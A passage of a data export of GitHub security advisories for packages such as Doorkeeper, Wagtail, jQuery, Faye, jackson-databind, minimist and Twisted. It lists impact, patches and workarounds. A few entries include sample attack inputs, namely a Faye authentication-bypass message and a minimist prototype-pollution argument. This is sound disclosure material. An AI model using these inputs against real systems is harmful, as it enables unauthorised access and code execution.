Brute force vulnerability when using password authentication via Sorcery. The brute force protection submodule will prevent a brute force attack for the defined lockout period, but once expired protection will not be re-enabled until a user or malicious actor logs in successfully. This does not affect users that do not use the built-in brute force protection submodule, nor users that use permanent account lockout.

### Patches
Patched as of version `0.15.0`.

### Workarounds
Currently no workarounds, other than monkey patching the authenticate method provided by Sorcery or upgrading to version `0.15.0`.",rubygems
829,26832,doorkeeper,GHSA-j7vx-8mqj-cqp9,CVE-2020-10187,https://github.com/advisories/GHSA-j7vx-8mqj-cqp9,high,2020-05-07 21:11:07 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Doorkeeper,"### Impact
Information disclosure vulnerability. Allows an attacker to see all `Doorkeeper::Application` model attribute values (including secrets) using authorized applications controller if it's enabled (GET /oauth/authorized_applications.json).

### Patches

These versions have the fix:

* 5.0.3
* 5.1.1
* 5.2.5
* 5.3.2

### Workarounds
Patch `Doorkeeper::Application` model `#as_json(options = {})` method and define only those attributes you want to expose.

Additional recommended hardening is to enable application secrets hashing ([guide](https://doorkeeper.gitbook.io/guides/security/token-and-application-secrets)), available since Doorkeeper 5.1. This would render the exposed secret useless.

### References

- Commit with fix: https://github.com/doorkeeper-gem/doorkeeper/commit/25d038022c2fcad45af5b73f9d003cf38ff491f6
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10187",rubygems
830,20088,wagtail,GHSA-jjjr-3jcw-f8v6,CVE-2020-11037,https://github.com/advisories/GHSA-jjjr-3jcw-f8v6,moderate,2020-05-07 18:04:53 UTC,Potential Observable Timing Discrepancy in Wagtail,"### Impact
A potential timing attack exists on pages or documents that have been protected with a shared password through Wagtail's ""Privacy"" controls. This password check is performed through a character-by-character string comparison, and so an attacker who is able to measure the time taken by this check to a high degree of accuracy could potentially use timing differences to gain knowledge of the password. (This is [understood to be feasible on a local network, but not on the public internet](https://groups.google.com/d/msg/django-developers/iAaq0pvHXuA/fpUuwjK3i2wJ).)

Privacy settings that restrict access to pages / documents on a per-user or per-group basis (as opposed to a shared password) are unaffected by this vulnerability.

### Patches
Patched versions have been released as Wagtail 2.7.3 (for the LTS 2.7 branch), Wagtail 2.8.2 and Wagtail 2.9.

### Workarounds
Site owners who are unable to upgrade to the new versions can use [user- or group-based privacy restrictions](https://docs.wagtail.io/en/stable/advanced_topics/privacy.html) to restrict access to sensitive information; these are unaffected by this vulnerability.",pip
831,20810,apache-airflow,GHSA-rjvg-q57v-mjjc,CVE-2019-12398,https://github.com/advisories/GHSA-rjvg-q57v-mjjc,moderate,2020-05-06 19:51:02 UTC,XSS in Apache Airflow,"In Apache Airflow before 1.10.5 when running with the ""classic"" UI, a malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views. The new ""RBAC"" UI is unaffected.",pip
832,20776,pysaml2,GHSA-qf7v-8hj3-4xw7,CVE-2020-5390,https://github.com/advisories/GHSA-qf7v-8hj3-4xw7,high,2020-05-06 19:41:29 UTC,Improper Verification of Cryptographic Signature in PySAML2,"PySAML2 before 5.0.0 does not check that the signature in a SAML document is enveloped and thus signature wrapping is effective, i.e., it is affected by XML Signature Wrapping (XSW). The signature information and the node/object that is signed can be in different places and thus the signature verification will succeed, but the wrong data will be used. This specifically affects the verification of assertion that have been signed.",pip
833,16125,qs,GHSA-gqgv-6jq5-jjj9,CVE-2017-1000048,https://github.com/advisories/GHSA-gqgv-6jq5-jjj9,high,2020-04-30 17:16:47 UTC,Prototype Pollution Protection Bypass in qs,"Affected version of `qs` are vulnerable to Prototype Pollution because it is possible to bypass the protection. The `qs.parse` function fails to properly prevent an object's prototype to be altered when parsing arbitrary input. Input containing `[` or `]` may bypass the prototype pollution protection and alter the Object prototype. This allows attackers to override properties that will exist in all objects, which may lead to Denial of Service or Remote Code Execution in specific circumstances.


## Recommendation

Upgrade to 6.0.4, 6.1.2, 6.2.3, 6.3.2 or later.",npm
834,16344,acorn,GHSA-6chw-6frg-f759,,https://github.com/advisories/GHSA-6chw-6frg-f759,high,2020-04-03 21:48:38 UTC,Regular Expression Denial of Service in Acorn,"Affected versions of acorn are vulnerable to Regular Expression Denial of Service.
A regex in the form of /[x-\ud800]/u causes the parser to enter an infinite loop.
The string is not valid UTF16 which usually results in it being sanitized before reaching the parser.
If an application processes untrusted input and passes it directly to acorn,
attackers may leverage the vulnerability leading to Denial of Service.",npm
835,15892,jquery,GHSA-gxr4-xjj5-5px2,CVE-2020-11022,https://github.com/advisories/GHSA-gxr4-xjj5-5px2,moderate,2020-04-29 22:18:55 UTC,Potential XSS vulnerability in jQuery,"### Impact
Passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.

### Patches
This problem is patched in jQuery 3.5.0.

### Workarounds
To workaround the issue without upgrading, adding the following to your code:

```js
jQuery.htmlPrefilter = function( html ) {
	return html;
};
```

You need to use at least jQuery 1.12/2.2 or newer to be able to apply this workaround.

### References
https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
https://jquery.com/upgrade-guide/3.5/

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery repo](https://github.com/jquery/jquery/issues). If you don't find an answer, open a new issue.",npm
836,15892,jquery,GHSA-jpcq-cgw6-v4j6,CVE-2020-11023,https://github.com/advisories/GHSA-jpcq-cgw6-v4j6,moderate,2020-04-29 22:19:14 UTC,Potential XSS vulnerability in jQuery,"### Impact
Passing HTML containing `<option>` elements from untrusted sources - even after sanitizing them - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.

### Patches
This problem is patched in jQuery 3.5.0.

### Workarounds
To workaround this issue without upgrading, use [DOMPurify](https://github.com/cure53/DOMPurify) with its `SAFE_FOR_JQUERY` option to sanitize the HTML string before passing it to a jQuery method.

### References
https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery repo](https://github.com/jquery/jquery/issues). If you don't find an answer, open a new issue.",npm
837,19436,faye,GHSA-qpg4-4w7w-2mq5,CVE-2020-11020,https://github.com/advisories/GHSA-qpg4-4w7w-2mq5,high,2020-04-29 17:41:15 UTC,Authentication and extension bypass in Faye,"On 20 April 2020 it was reported to me that the potential for authentication
bypass exists in [Faye][1]'s extension system. This vulnerability has existed in
the Node.js and Ruby versions of the server since version 0.5.0, when extensions
were first introduced, in July 2010. It is patched in versions 1.0.4, 1.1.3 and
1.2.5, which we are releasing today.

The vulnerability allows any client to bypass checks put in place by server-side
extensions, by appending extra segments to the message channel. For example, the
Faye [extension docs][2] suggest that users implement access control for
subscriptions by checking incoming messages for the `/meta/subscribe` channel,
for example:

```js
server.addExtension({
  incoming: function(message, callback) {
    if (message.channel === '/meta/subscribe') {
      if (message.ext.authToken !== 'my super secret password') {
        message.error = 'Invalid auth token';
      }
    }
    callback(message);
  }
});
```

A bug in the server's code for recognising the special `/meta/*` channels, which
trigger connection and subscription events, means that a client can bypass this
check by sending a message to `/meta/subscribe/x` rather than `/meta/subscribe`:

```json
{
  ""channel"": ""/meta/subscribe/x"",
  ""clientId"": ""3jrc6602npj4gyp6bn5ap2wqzjtb2q3"",
  ""subscription"": ""/foo""
}
```

This message will not be checked by the above extension, as it checks the
message's channel is exactly equal to `/meta/subscribe`. But it will still be
processed as a subscription request by the server, so the client becomes
subscribed to the channel `/foo` without supplying the necessary credentials.

The vulnerability is caused by the way the Faye server recognises meta channels.
It will treat a message to any channel that's a prefix-match for one of the
special channels `/meta/handshake`, `/meta/connect`, `/meta/subscribe`,
`/meta/unsubscribe` or `/meta/disconnect`, as though it were an exact match for
that channel. So, a message to `/meta/subscribe/x` is still processed as a
subscription request, for example.

An authentication bypass for subscription requests is the most serious effect of
this but all other meta channels are susceptible to similar manipulation.

This parsing bug in the server is fixed in versions 1.0.4, 1.1.3 and 1.2.5.
These should be drop-in replacements for prior versions and you should upgrade
immediately if you are running any prior version.

If you are unable to install one of these versions, you can make your extensions
catch all messages the server would process by checking the channel _begins_
with the expected channel name, for example:

```js
server.addExtension({
  incoming: function(message, callback) {
    if (message.channel.startsWith('/meta/subscribe')) {
      // authentication logic
    }
    callback(message);
  }
});
```

[1]: https://faye.jcoglan.com/
[2]: https://faye.jcoglan.com/node/extensions.html",rubygems
838,19170,bson,GHSA-qh4w-7pw3-p4rp,CVE-2015-4411,https://github.com/advisories/GHSA-qh4w-7pw3-p4rp,high,2020-04-29 15:34:50 UTC,Potential denial of service in bson rubygem,The Moped::BSON::ObjecId.legal? method in mongodb/bson-ruby before 3.0.4 as used in rubygem-moped allows remote attackers to cause a denial of service (worker resource consumption) via a crafted string. NOTE: This issue is due to an incomplete fix to CVE-2015-4410.,rubygems
839,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-27xj-rqx5-2255,CVE-2020-11619,https://github.com/advisories/GHSA-27xj-rqx5-2255,high,2020-05-15 18:58:44 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.springframework.aop.config.MethodLocatingFactoryBean (aka spring-aop).",maven
840,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-9vvp-fxw6-jcxr,CVE-2020-11113,https://github.com/advisories/GHSA-9vvp-fxw6-jcxr,high,2020-05-15 18:58:47 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.openjpa.ee.WASRegistryManagedRuntime (aka openjpa).",maven
841,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-v3xw-c963-f5hc,CVE-2020-11111,https://github.com/advisories/GHSA-v3xw-c963-f5hc,high,2020-05-15 18:58:50 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.activemq.* (aka activemq-jms, activemq-core, activemq-pool, and activemq-pool-jms).",maven
842,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-rf6r-2c4q-2vwg,CVE-2020-10968,https://github.com/advisories/GHSA-rf6r-2c4q-2vwg,high,2020-05-15 18:58:54 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.aoju.bus.proxy.provider.remoting.RmiProvider (aka bus-proxy).",maven
843,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-cf6r-3wgc-h863,CVE-2019-14892,https://github.com/advisories/GHSA-cf6r-3wgc-h863,high,2020-05-15 18:58:58 UTC,Polymorphic deserialization of malicious object in jackson-databind,"A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5 and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.",maven
844,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-758m-v56v-grj4,CVE-2020-10969,https://github.com/advisories/GHSA-758m-v56v-grj4,high,2020-04-23 21:36:03 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to javax.swing.JEditorPane.",maven
845,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-5p34-5m6p-p58g,CVE-2020-9546,https://github.com/advisories/GHSA-5p34-5m6p-p58g,critical,2020-04-23 21:08:40 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig (aka shaded hikari-config).",maven
846,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-p43x-xfjf-5jhr,CVE-2020-9548,https://github.com/advisories/GHSA-p43x-xfjf-5jhr,critical,2020-05-15 18:59:01 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPConfig (aka anteros-core).",maven
847,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-h4rc-386g-6m85,CVE-2020-11620,https://github.com/advisories/GHSA-h4rc-386g-6m85,high,2020-04-23 20:19:02 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.jelly.impl.Embedded (aka commons-jelly).",maven
848,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-95cm-88f5-f2c7,CVE-2020-10672,https://github.com/advisories/GHSA-95cm-88f5-f2c7,high,2020-04-23 16:32:59 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory (aka aries.transaction.jms).",maven
849,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-q93h-jc49-78gg,CVE-2020-9547,https://github.com/advisories/GHSA-q93h-jc49-78gg,critical,2020-05-15 18:59:10 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig (aka ibatis-sqlmap).",maven
850,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-qmqc-x3r4-6v39,CVE-2019-14893,https://github.com/advisories/GHSA-qmqc-x3r4-6v39,high,2020-05-15 18:59:07 UTC,Polymorphic deserialization of malicious object in jackson-databind,"A flaw was discovered in FasterXML jackson-databind in all versions before 2.9.10 and 2.10.0, where it would permit polymorphic deserialization of malicious objects using the xalan JNDI gadget when used in conjunction with polymorphic type handling methods such as `enableDefaultTyping()` or when @JsonTypeInfo is using `Id.CLASS` or `Id.MINIMAL_CLASS` or in any other way which ObjectMapper.readValue might instantiate objects from unsafe sources. An attacker could use this flaw to execute arbitrary code.",maven
851,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-fqwf-pjwf-7vqv,CVE-2020-10673,https://github.com/advisories/GHSA-fqwf-pjwf-7vqv,moderate,2020-05-15 18:59:04 UTC,jackson-databind mishandles the interaction between serialization gadgets and typing,"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.caucho.config.types.ResourceRef (aka caucho-quercus).",maven
852,20473,markdown2,GHSA-fv3h-8x5j-pvgq,CVE-2020-11888,https://github.com/advisories/GHSA-fv3h-8x5j-pvgq,moderate,2020-04-22 20:59:50 UTC,XSS in python-markdown2,"python-markdown2 through 2.3.8 allows XSS because element names are mishandled unless a \w+ match succeeds. For example, an attack might use elementname@ or elementname- with an onclick attribute.",pip
853,17334,https-proxy-agent,GHSA-pc5p-h8pf-mvwp,,https://github.com/advisories/GHSA-pc5p-h8pf-mvwp,moderate,2020-04-16 03:14:56 UTC,Machine-In-The-Middle in https-proxy-agent,"Versions of `https-proxy-agent` prior to 2.2.3 are vulnerable to Machine-In-The-Middle. The package fails to enforce TLS on the socket if the proxy server responds the to the request with a HTTP status different than 200. This allows an attacker with access to the proxy server to intercept unencrypted communications, which may include sensitive information such as credentials.


## Recommendation

Upgrade to version 3.0.0 or 2.2.3.",npm
854,16142,node-uuid,GHSA-265q-28rp-chq5,CVE-2015-8851,https://github.com/advisories/GHSA-265q-28rp-chq5,high,2020-04-16 03:14:50 UTC,Insecure Entropy Source - Math.random() in node-uuid,"Affected versions of `node-uuid` consistently fall back to using `Math.random` as an entropy source instead of `crypto`, which may result in guessable UUID's.



## Recommendation

Update to version 1.4.4 or later.",npm
855,17508,sanitize-html,GHSA-3j7m-hmh3-9jmp,CVE-2016-1000237,https://github.com/advisories/GHSA-3j7m-hmh3-9jmp,moderate,2020-04-16 03:14:47 UTC,Cross-Site Scripting in sanitize-html,"Affected versions of `sanitize-html` do not sanitize input recursively, which may allow an attacker to execute arbitrary Javascript.


## Recommendation

Update to version 1.4.3 or later.",npm
856,35825,org.keycloak:keycloak-core,GHSA-3gg7-9q2x-79fc,CVE-2020-1728,https://github.com/advisories/GHSA-3gg7-9q2x-79fc,moderate,2020-04-15 21:09:40 UTC,Improper Restriction of Rendered UI Layers or Frames in Keycloak,"A vulnerability was found in all versions of Keycloak where, the pages on the Admin Console area of the application are completely missing general HTTP security headers in HTTP-responses. This does not directly lead to a security issue, yet it might aid attackers in their efforts to exploit other problems. The flaws unnecessarily make the servers more prone to Clickjacking, channel downgrade attacks and other similar client-based attack vectors.",maven
857,35825,org.keycloak:keycloak-core,GHSA-6pmv-7pr9-cgrj,CVE-2020-1731,https://github.com/advisories/GHSA-6pmv-7pr9-cgrj,critical,2020-04-15 21:09:27 UTC,Predictable password in Keycloak,"A flaw was found in all versions of the Keycloak operator, before version 8.0.2,(community only) where the operator generates a random admin password when installing Keycloak, however the password remains the same when deployed to the same OpenShift namespace.",maven
858,35825,org.keycloak:keycloak-core,GHSA-8vf3-4w62-m3pq,CVE-2020-1697,https://github.com/advisories/GHSA-8vf3-4w62-m3pq,moderate,2020-04-15 21:09:09 UTC,XSS in Keycloak,"It was found in all keycloak versions before 9.0.0 that links to external applications (Application Links) in the admin console are not validated properly and could allow Stored XSS attacks. An authed malicious user could create URLs to trick users in other realms, and possibly conduct further attacks.",maven
859,35825,org.keycloak:keycloak-core,GHSA-xfqh-7356-vqjj,CVE-2019-14820,https://github.com/advisories/GHSA-xfqh-7356-vqjj,moderate,2020-04-15 21:08:21 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Keycloak,"It was found that keycloak before version 8.0.0 exposes internal adapter endpoints in org.keycloak.constants.AdapterConstants, which can be invoked via a specially-crafted URL. This vulnerability could allow an attacker to access unauthorized information.",maven
860,20088,wagtail,GHSA-v2wc-pfq2-5cm6,CVE-2020-11001,https://github.com/advisories/GHSA-v2wc-pfq2-5cm6,moderate,2020-04-14 23:09:29 UTC,Possible XSS attack in Wagtail,"### Impact
A cross-site scripting (XSS) vulnerability exists on the page revision comparison view within the Wagtail admin interface. A user with a limited-permission editor account for the Wagtail admin could potentially craft a page revision history that, when viewed by a user with higher privileges, could perform actions with that user's credentials. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.

### Patches
Patched versions have been released as Wagtail 2.7.2 (for the LTS 2.7 branch) and Wagtail 2.8.1 (for the current 2.8 branch).

### Workarounds
Site owners who are unable to upgrade to the new versions can disable the revision comparison view by adding the following URL route to the top of their project's `urls.py` configuration:

    from django.views.generic.base import RedirectView

    urlpatterns = [
        url(r'^admin/pages/(\d+)/revisions/compare/', RedirectView.as_view(url='/admin/')),
        # ...
    ]

### Acknowledgements
Many thanks to Vlad Gerasimenko for reporting this issue.

### For more information
If you have any questions or comments about this advisory:
* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)
* Email us at [security@wagtail.io](mailto:security@wagtail.io) (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)",pip
861,38556,io.dropwizard:dropwizard-validation,GHSA-8jpx-m2wh-2v34,CVE-2020-11002,https://github.com/advisories/GHSA-8jpx-m2wh-2v34,high,2020-04-10 18:42:20 UTC,Remote Code Execution (RCE) vulnerability in dropwizard-validation,"### Summary

A server-side template injection was identified in the self-validating ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html)) feature of **dropwizard-validation** enabling attackers to inject arbitrary Java EL expressions, leading to Remote Code Execution (RCE) vulnerability.

If you're using a self-validating bean (via [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html)), an upgrade to Dropwizard 1.3.21/2.0.3 or later is strongly recommended.

The changes introduced in Dropwizard 1.3.19 and 2.0.2 (see [GHSA-3mcp-9wr4-cjqf](https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf)/[CVE-2020-5245](https://github.com/advisories/GHSA-3mcp-9wr4-cjqf)) unfortunately didn't fix the underlying issue completely.

### Impact

This issue may allow Remote Code Execution (RCE), allowing to run arbitrary code on the host system (with the privileges of the Dropwizard service account privileges) by injecting arbitrary [Java Expression Language (EL)](https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-interpolation-with-message-expressions) expressions when using the self-validating feature ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html), [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidation.html)) in **dropwizard-validation**.

### Patches

The issue has been fixed in **dropwizard-validation** **1.3.21** and **2.0.3** or later. We strongly recommend upgrading to one of these versions.

The evaluation of EL expressions has been disabled by default now.

In order to use some interpolation in the violation messages added to [`ViolationCollector`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html), it has to be explicitly allowed by setting [`SelfValidating#escapeExpressions()`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html#escapeExpressions--) to `false`.

It is also recommended to use the `addViolation` methods supporting message parameters instead of EL expressions introduced in Dropwizard 1.3.21 and 2.0.3:
* [`ViolationCollector#addViolation(String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.util.Map-)
* [`ViolationCollector#addViolation(String, String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.String-java.util.Map-)
* [`ViolationCollector#addViolation(String, String, Integer, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.Integer-java.lang.String-java.util.Map-)
* [`ViolationCollector#addViolation(String, String, String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.String-java.lang.String-java.util.Map-)


### Workarounds

If you are not able to upgrade to one of the aforementioned versions of **dropwizard-validation** but still want to use the [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html) feature, make sure to properly sanitize any message you're adding to the [`ViolationCollector`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html) in the method annotated with [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidation.html).

Example:
```java
@SelfValidation
public void validateFullName(ViolationCollector col) {
    if (fullName.contains(""_"")) {
        // Sanitize fullName variable by escaping relevant characters such as ""$""
        col.addViolation(""Full name contains invalid characters:  "" + sanitizeJavaEl(fullName));
    }
}
```

See also:
https://github.com/dropwizard/dropwizard/blob/v2.0.3/dropwizard-validation/src/main/java/io/dropwizard/validation/InterpolationHelper.java

### References

* https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf
* https://github.com/dropwizard/dropwizard/pull/3208
* https://github.com/dropwizard/dropwizard/pull/3209
* https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-hibernateconstraintvalidatorcontext

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [dropwizard/dropwizard](https://github.com/dropwizard/dropwizard/issues/new)
* Start a discussion on the [dropwizard-dev mailing list](https://groups.google.com/forum/#!forum/dropwizard-dev)

### Security contact

If you want to responsibly disclose a security issue in Dropwizard or one of its official modules, please contact us via the published channels in our [security policy](https://github.com/dropwizard/dropwizard/security/policy):

https://github.com/dropwizard/dropwizard/security/policy#reporting-a-vulnerability",maven
862,15918,minimist,GHSA-vh95-rmgr-6w4m,CVE-2020-7598,https://github.com/advisories/GHSA-vh95-rmgr-6w4m,moderate,2020-04-03 21:48:32 UTC,Prototype Pollution in minimist,"Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  
Parsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  
This is exploitable if attackers have control over the arguments being passed to `minimist`.



## Recommendation

Upgrade to versions 0.2.1, 1.2.3 or later.",npm
863,19844,Pillow,GHSA-5gm3-px64-rw72,CVE-2019-19911,https://github.com/advisories/GHSA-5gm3-px64-rw72,high,2020-04-01 16:36:44 UTC,Uncontrolled Resource Consumption in Pillow,"There is a DoS vulnerability in Pillow before 6.2.2 caused by FpxImagePlugin.py calling the range function on an unvalidated 32-bit integer if the number of bands is large. On Windows running 32-bit Python, this results in an OverflowError or MemoryError due to the 2 GB limit. However, on Linux running 64-bit Python this results in the process being terminated by the OOM killer.",pip
864,19844,Pillow,GHSA-hj69-c76v-86wr,CVE-2020-5313,https://github.com/advisories/GHSA-hj69-c76v-86wr,high,2020-04-01 16:36:00 UTC,Out-of-bounds Read in Pillow,libImaging/FliDecode.c in Pillow before 6.2.2 has an FLI buffer overflow.,pip
865,18032,knockout,GHSA-vcjj-xf2r-mwvc,CVE-2019-14862,https://github.com/advisories/GHSA-vcjj-xf2r-mwvc,moderate,2020-04-01 15:47:45 UTC,XSS in knockout,"There is a vulnerability in knockout before version 3.5.0-beta, where after escaping the context of the web application, the web application delivers data to its users along with other trusted dynamic content, without validating it.",npm
866,19979,ecdsa,GHSA-8qxj-f9rh-9fg2,CVE-2019-14859,https://github.com/advisories/GHSA-8qxj-f9rh-9fg2,critical,2020-04-01 16:35:26 UTC,Improper Verification of Cryptographic Signature in Pure-Python ECDSA,"A flaw was found in all python-ecdsa versions before 0.13.3, where it did not correctly verify whether signatures used DER encoding. Without this verification, a malformed signature could be accepted, making the signature malleable. Without proper verification, an attacker could use a malleable signature to create false transactions.",pip
867,19917,Twisted,GHSA-h96w-mmrf-2h6v,CVE-2020-10108,https://github.com/advisories/GHSA-h96w-mmrf-2h6v,critical,2020-03-31 15:42:42 UTC,Improper Input Validation in Twisted,"In Twisted Web through 20.3.0, there was an HTTP request splitting vulnerability. When presented with two content-length headers, it ignored the first header. When the second content-length value was set to zero, the request body was interpreted as a pipelined request.",pip
868,19917,Twisted,GHSA-p5xh-vx83-mxcj,CVE-2020-10109,https://github.com/advisories/GHSA-p5xh-vx83-mxcj,critical,2020-03-31 15:40:12 UTC,HTTP Request Smuggling in Twisted,"In Twisted Web through 20.3.0, there was an HTTP request splitting vulnerability. When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted as a pipelined request.",pip
869,19060,actionview,GHSA-65cv-r6x7-79hv,CVE-2020-5267,https://github.com/advisories/GHSA-65cv-r6x7-79hv,moderate,2020-03-19 17:30:29 UTC,Possible XSS vulnerability in ActionView,"There is a possible XSS vulnerability in ActionView's JavaScript literal escape helpers.  Views that use the `j` or `escape_javascript` methods may be susceptible to XSS attacks.

### Impact

There is a possible XSS vulnerability in the `j` and `escape_javascript` methods in ActionView.  These methods are used for escaping JavaScript string literals.  Impacted code will look something like this:

```erb
<script>let a = `<%= j unknown_input %>`</script>
```

or

```erb
<script>let a = `<%= escape_javascript unknown_input %>`</script>
```

### Releases

The 6.0.2.2 and 5.2.4.2 releases are available at the normal locations.

### Workarounds

For those that can't upgrade, the following monkey patch may be used:

```ruby
ActionView::Helpers::JavaScriptHelper::JS_ESCAPE_MAP.merge!(
  {
    ""`"" => ""\\`"",
    ""$"" => ""\\$""
  }
)

module ActionView::Helpers::JavaScriptHelper
  alias :old_ej :escape_javascript
  alias :old_j :j

  def escape_javascript(javascript)
    javascript = javascript.to_s
    if javascript.empty?
      result = """"
    else
      result = javascript.gsub(/(\\|<\/|\r\n|\342\200\250|\342\200\251|[\n\r""']|[`]|[$])/u, JS_ESCAPE_MAP)
    end
    javascript.html_safe? ? result.html_safe : result
  end

  alias :j :escape_javascript
end
```

### Patches

To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* [5-2-js-helper-xss.patch](https://gist.github.com/tenderlove/c042ff49f0347c37e99183a6502accc6#file-5-2-js-helper-xss-patch) - Patch for 5.2 series
* [6-0-js-helper-xss.patch](https://gist.github.com/tenderlove/c042ff49f0347c37e99183a6502accc6#file-6-0-js-helper-xss-patch) - Patch for 6.0 series

Please note that only the 5.2 and 6.0 series are supported at present. Users
of earlier unsupported releases are advised to upgrade as soon as possible as we
cannot guarantee the continued availability of security fixes for unsupported
releases.

### Credits

Thanks to Jesse Campos from Chef Secure",rubygems
870,16863,next,GHSA-fq77-7p7r-83rj,CVE-2020-5284,https://github.com/advisories/GHSA-fq77-7p7r-83rj,moderate,2020-03-30 20:40:50 UTC,Directory Traversal in Next.js,"### Impact

- **Not affected**: Deployments on ZEIT Now v2 ([https://zeit.co](https://zeit.co/)) are not affected
- **Not affected**: Deployments using the `serverless` target
- **Not affected**: Deployments using `next export`
- **Affected**: Users of Next.js below 9.3.2

We recommend everyone to upgrade regardless of whether you can reproduce the issue or not.

### Patches

https://github.com/zeit/next.js/releases/tag/v9.3.2

### References

https://github.com/zeit/next.js/releases/tag/v9.3.2",npm
